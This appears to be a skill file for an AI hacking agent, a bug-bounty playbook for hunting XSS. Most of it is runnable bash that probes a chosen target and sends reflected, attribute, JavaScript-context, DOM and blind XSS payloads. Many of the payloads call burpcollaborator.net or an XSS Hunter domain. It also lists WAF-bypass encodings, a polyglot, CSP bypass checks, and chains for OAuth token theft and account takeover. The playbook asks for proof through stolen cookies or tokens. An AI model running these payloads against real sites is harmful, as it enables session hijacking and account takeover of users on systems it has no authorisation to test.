---
name: k1nzr3c0n-hunt-xss
description: "XSS hunting skill built from 174 disclosed bug bounty reports. Covers reflected, stored, DOM, and blind XSS. Includes CSP bypass table, SVG payloads, mXSS, AngularJS CSTI, 6 chain patterns (XSS→ATO, cache-poison→CDN stored, DOM XSS→OAuth token capture). Integrates with k1nzr3c0n JS analyst output."
tags: [xss, hunt, web-security, bug-bounty]
report_count: 174
---

# K1NZR3C0N Hunt — XSS

> **Marker rule**: Use 8+ char alphanumeric markers. Never: test, xss, payload, evil, alert.
> **Gate 0**: Confirm reflection in response body before proceeding.

---

## Crown Jewels (Highest Payout XSS)

```
Priority 1 — Stored XSS on admin panel (admin sees victim data)
Priority 2 — Stored XSS on payment/checkout flow
Priority 3 — DOM XSS that steals auth tokens (localStorage/sessionStorage)
Priority 4 — Reflected XSS on login/OAuth callback (chain to ATO)
Priority 5 — Blind XSS in support ticket / logging system
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
MARKER="${MARKER:-$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 10)}"
HUNT="/tmp/hunt_xss_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
echo "[+] Target : $TARGET"
echo "[+] Marker : $MARKER (USE THIS IN ALL PAYLOADS)"
echo "[+] Workspace: $HUNT"

# Pull XSS candidate endpoints from k1nzr3c0n outputs
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s]+[?&][^\s]*(?:q|search|query|q|s|msg|message|redirect|url|next|return_to|ref|callback|output|format|lang|theme|sort|order)=[^\s&"]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/xss_candidates.txt" | wc -l \
  | xargs echo "XSS candidates from recon:"
```

## Phase 1 — Signal Detection (Where to Look)

```bash
echo "=== XSS Attack Surface Signals ==="

# Reflection candidates from k1nzr3c0n JS analyst outputs
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
if [ -d "$JS_DIR" ]; then
  echo "[+] Using JS analyst download cache"
  # Parameters from JS files
  grep -hoP '(?:fetch|axios\.get|XMLHttpRequest)[^;]{0,200}' "$JS_DIR"/*.js 2>/dev/null \
    | grep -oP '[\?&][a-zA-Z_-]+=' | sort -u | sed 's/^/  param: /'
fi

# URL parameters from all endpoints
grep -hoP '[?&][a-zA-Z_-]+=' "$HUNT/xss_candidates.txt" 2>/dev/null \
  | sort | uniq -c | sort -rn | head -20 \
  | awk '{print "  [" $1 "x] " $2}'

# Error pages that reflect input
echo ""
echo "=== Testing basic reflection ==="
for EP in $(head -20 "$HUNT/xss_candidates.txt" 2>/dev/null); do
  RESP=$(curl -sk "${EP}${MARKER}" 2>/dev/null)
  echo "$RESP" | grep -q "$MARKER" && echo "  [REFLECT] $EP"
done
```

## Phase 2 — Reflected XSS Testing

```bash
# ALWAYS check baseline first
ENDPOINT="${XSS_ENDPOINT:-https://${TARGET}/search?q=}"
BASELINE=$(curl -sk "${ENDPOINT}baseline_check_xyz" | wc -c)
echo "Baseline size: $BASELINE bytes"

# Probe tier 1: bare marker (is it reflected at all?)
PROBE=$(curl -sk "${ENDPOINT}${MARKER}")
echo "$PROBE" | grep -q "$MARKER" || { echo "[KILL] No reflection — move on"; exit 0; }
echo "[+] Marker reflected in response"

# Probe tier 2: HTML context detection
echo "$PROBE" | grep -oP '.{30}'$MARKER'.{30}' | head -3

# Probe tier 3: character filtering detection
for CHAR in '<' '>' '"' "'" '(' ')' '{' '}' '/'; do
  ESCAPED=$(curl -sk "${ENDPOINT}${MARKER}${CHAR}test" | grep -oP "${MARKER}.{0,5}")
  echo "  [$CHAR] → $ESCAPED"
done

# ── Payloads by context ────────────────────────────────────────────────────────
echo ""
echo "=== Payload Testing by HTML Context ==="

# HTML tag context: <div>MARKER</div>
PAYLOADS_HTML=(
  "<script>fetch('https://burpcollaborator.net/${MARKER}')</script>"
  "<img src=x onerror=fetch('https://burpcollaborator.net/${MARKER}')>"
  "<svg/onload=fetch('https://burpcollaborator.net/${MARKER}')>"
  "<details/open/ontoggle=fetch('https://burpcollaborator.net/${MARKER}')>"
  "<body onload=fetch('https://burpcollaborator.net/${MARKER}')>"
)

# HTML attribute context: <input value="MARKER">
PAYLOADS_ATTR=(
  "\" onmouseover=\"fetch('https://burpcollaborator.net/${MARKER}')\""
  "' onfocus='fetch(\"https://burpcollaborator.net/${MARKER}\")"
  "\"autofocus onfocus=\"fetch('https://burpcollaborator.net/${MARKER}')\""
)

# JavaScript context: var x = "MARKER"
PAYLOADS_JS=(
  "\";fetch('https://burpcollaborator.net/${MARKER}');//"
  "';fetch('https://burpcollaborator.net/${MARKER}');//"
  "\`\${fetch('https://burpcollaborator.net/${MARKER}')}\`"
)

for P in "${PAYLOADS_HTML[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "${ENDPOINT}$(python3 -c "import urllib.parse; print(urllib.parse.quote('$P'))")")
  echo "  [HTML] $STATUS → ${P:0:50}..."
done
```

## Phase 3 — WAF Bypass Techniques

```bash
echo "=== WAF Bypass Attempts ==="

ENDPOINT="${XSS_ENDPOINT:-https://${TARGET}/search?q=}"

# Encoding bypasses
BYPASSES=(
  # HTML entity encode
  "&lt;script&gt;fetch('//x.${MARKER}.burpcollaborator.net')&lt;/script&gt;"
  # Unicode escape
  "<script>fetch('//x.${MARKER}.burpcollaborator.net')</script>"
  # Double URL encode  
  "%253Cscript%253Efetch('//x.${MARKER}.burpcollaborator.net')%253C/script%253E"
  # Case variation
  "<ScRiPt>fetch('//x.${MARKER}.burpcollaborator.net')</ScRiPt>"
  # No quotes needed
  "<img src=x onerror=fetch(String.fromCharCode(104,116,116,112,115,58))>"
  # SVG namespace
  "<svg><script>fetch('//x.${MARKER}.burpcollaborator.net')</script></svg>"
  # Data URI
  "<iframe src=\"data:text/html,<script>parent.fetch('//x.${MARKER}.burpcollaborator.net')</script>\">"
  # mXSS: math+style trick
  "<math><mtext></math><img src=x onerror=fetch('//x.${MARKER}.burpcollaborator.net')>"
  # Polyglot
  "javascript:/*--></title></style></textarea></script></xmp><svg/onload=fetch('//x.${MARKER}.burpcollaborator.net')>"
)

for B in "${BYPASSES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$B" 2>/dev/null)
  RESP=$(curl -sk -o /dev/null -w '%{http_code}' "${ENDPOINT}${ENCODED}")
  echo "  [$RESP] ${B:0:60}..."
done
```

## Phase 4 — Stored XSS Injection Points

```bash
echo "=== Stored XSS Targets ==="
# High-value injection points from recon
STORED_TARGETS=(
  "/profile/bio"
  "/settings/name"
  "/comments"
  "/posts/create"
  "/tickets/new"
  "/feedback"
  "/support"
  "/review"
  "/description"
  "/notes"
)

for EP in "${STORED_TARGETS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "https://${TARGET}${EP}")
  [ "$STATUS" -lt 400 ] && echo "  [EXISTS $STATUS] $EP"
done

echo ""
echo "Blind XSS payload (for support forms, admin panels):"
echo "  <script src='https://YOUR-XSS-HUNTER-DOMAIN/${MARKER}'></script>"
echo "  Services: xsshunter.trufflesecurity.com | canarytokens.org"
```

## Phase 5 — DOM XSS (from JS Analyst Output)

```bash
echo "=== DOM XSS Testing ==="
# Read sinks from JS analyst phase 6 output
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"

# Sources to test: location.hash, location.search, postMessage
echo "Testing location.hash sources:"
for EP in $(head -10 "$HUNT/xss_candidates.txt"); do
  # DOM XSS via fragment
  curl -sk "${EP}#${MARKER}<img/onerror=fetch('//x.${MARKER}.burp.net')>" -o /dev/null && \
    echo "  [TEST] $EP#PAYLOAD — check browser for execution"
done

echo ""
echo "DOM XSS payloads for innerHTML sink:"
echo "  <img src=x onerror=fetch('//x.${MARKER}.burpcollaborator.net')>"
echo "  <svg onload=fetch('//x.${MARKER}.burpcollaborator.net')>"
echo ""
echo "DOM XSS payloads for eval() sink:"
echo "  fetch('//x.${MARKER}.burpcollaborator.net')"
echo "  (function(){fetch('//x.${MARKER}.burpcollaborator.net')})()"
```

## Phase 6 — CSP Bypass Analysis

```bash
echo "=== CSP Policy Analysis ==="
CSP=$(curl -skI "https://${TARGET}/" | grep -i 'content-security-policy' | head -1)
echo "CSP: $CSP"

# Analyze weak CSP directives
echo "$CSP" | grep -q "unsafe-inline" && echo "  [BYPASS] unsafe-inline: script execution allowed"
echo "$CSP" | grep -q "unsafe-eval"   && echo "  [BYPASS] unsafe-eval: eval() allowed"
echo "$CSP" | grep -q "'none'"        && echo "  [STRICT] none directive detected"
echo "$CSP" | grep -q '\*'            && echo "  [WEAK] wildcard source in CSP"

# JSONP bypass if script-src has trusted CDNs
for CDN in \
  "accounts.google.com/o/oauth2/revoke?callback=fetch" \
  "ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js" \
  "cdn.jsdelivr.net/npm/" \
  "angular.io/"; do
  echo "$CSP" | grep -qi "$(echo $CDN | cut -d/ -f1)" && \
    echo "  [JSONP-BYPASS] $CDN whitelisted in script-src"
done
```

## Phase 7 — 6 Chain Patterns

```
CHAIN 1: Reflected XSS → OAuth token capture
  XSS on oauth callback page → steal access_token from URL/localStorage

CHAIN 2: Self-XSS + CSRF → ATO
  Self-XSS on profile field + CSRF on profile update form → force victim to store XSS

CHAIN 3: DOM XSS → OAuth token exfiltration  
  location.hash injection via postMessage → steal bearer token

CHAIN 4: Cache poison → CDN stored XSS
  Cache key omits cookie → poison CDN cache with XSS response → mass victims

CHAIN 5: SVG upload + CSP bypass
  Upload SVG with <script> → bypass CSP via data: URI or blob: origin

CHAIN 6: Stored XSS + privileged viewer
  XSS in field visible to admin → steal admin session → privilege escalation

To chain: prove each link independently first, then prove the full chain.
```

## Phase 8 — Gate 0 Validation

```bash
echo "=== XSS Gate 0 Checklist ==="
echo ""
echo "  □ Marker visible in response: $(curl -sk "${XSS_ENDPOINT}${MARKER}" | grep -c "$MARKER") times"
echo "  □ JavaScript actually EXECUTES (not just reflects) — test in browser"
echo "  □ Impact is cookie theft / token exfil — NOT just alert(1)"
echo "  □ Works in latest Chrome with default settings"
echo "  □ No browser extension required to trigger"
echo "  □ CSP does NOT block execution (test in browser console)"
echo ""
echo "  /skill k1nzr3c0n-triage → run 7Q gate before submitting"
```

---

## Report Title Formula

```
Stored XSS in [profile bio / comment / support ticket] leads to account takeover
Reflected XSS in [search parameter] on [endpoint] allows session hijacking
DOM XSS via location.hash in [component] enables auth token theft
```

## Evidence Required

```
1. Burp request showing injection
2. Burp response showing reflection or execution context
3. Browser screenshot showing popup / fetch callback
4. If blind XSS: XSS Hunter notification screenshot
5. If ATO chain: screenshot of exfiltrated cookie/token used to log in as victim
```
